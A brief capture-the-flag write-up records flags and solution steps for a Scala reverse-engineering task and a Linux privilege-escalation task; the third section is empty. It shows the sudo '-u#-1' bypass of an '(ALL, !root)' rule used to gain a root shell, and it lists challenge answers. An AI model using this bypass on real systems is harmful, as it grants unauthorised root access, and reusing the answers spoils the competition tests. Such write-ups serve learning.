# Enumeration & Exploitation

## Java++ (Easy)
1.  - 10 points
What language was this program written in?
- Scala
- google search code identifier
2.  - 15 points
What type does this program extend?
- App
- Line 1 has "Object Flag extenda App"
3.  - 40 points
What is an input to this program that will produce a successful exit code?
- SKY-SCLA-6830
- ran program "PracticeGameS26.py" to XOR Alpha and Beta list and get the char 
- saw that the input XOR Alpha should = beta so alpha XOR beta = input


## Game Studio (Medium)
1. What is the contents of the flag.txt file? (100 pts)
- SKY-SUDO-6013
- cat password to find out my password for user plebe is "password"
- ran " sudo -l" > User plebe may run the following commands on game-studio-medium:
    (ALL, !root) /bin/bash which is a CVE
- ran "sudo -u#-1 /bin/bash" to bypass the prevention of running sudo as root, changed to root user, navigated to "/root" 
and ran "cat flag.txt" 


## Password Manager (Hard)

